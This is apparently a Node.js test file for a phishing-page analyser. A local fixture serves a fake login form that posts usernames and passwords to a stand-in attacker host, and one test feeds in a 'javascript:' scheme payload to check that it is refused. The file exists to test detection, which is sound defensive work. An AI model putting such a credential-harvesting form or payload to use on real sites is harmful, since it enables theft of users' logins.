import { test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { detonate } from "./detonate.js";

// Local-only fixture server — never hits a real domain (§13 safety rules).
function startFixtureServer() {
  const server = http.createServer((req, res) => {
    if (req.url === "/start") {
      res.writeHead(302, { Location: "/login" });
      res.end();
      return;
    }
    if (req.url === "/login") {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end(`
        <html><body>
          <form method="POST" action="http://evil.invalid/collect">
            <input type="text" name="username">
            <input type="password" name="password">
          </form>
        </body></html>
      `);
      return;
    }
    if (req.url === "/plain") {
      res.writeHead(200, { "Content-Type": "text/plain" });
      res.end("just text, no forms");
      return;
    }
    res.writeHead(404);
    res.end();
  });
  return new Promise((resolve) => server.listen(0, "127.0.0.1", () => resolve(server)));
}

test("follows redirect chain and flags cross-domain password form", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/start`);
    assert.equal(result.redirect_chain.length, 2);
    assert.equal(result.redirect_chain[0].status, 302);
    assert.equal(result.redirect_chain[1].status, 200);
    assert.equal(result.forms.length, 1);
    assert.equal(result.forms[0].asks_password, true);
    assert.equal(result.forms[0].cross_domain, true);
    assert.match(result.summary, /asks for a password/);
  } finally {
    server.close();
  }
});

test("non-HTML response returns empty forms, no crash", async () => {
  const server = await startFixtureServer();
  const { port } = server.address();
  try {
    const result = await detonate(`http://127.0.0.1:${port}/plain`);
    assert.deepEqual(result.forms, []);
  } finally {
    server.close();
  }
});

test("refuses non-http(s) schemes", async () => {
  const result = await detonate("javascript:alert(1)");
  assert.match(result.error, /refused non-http/);
});
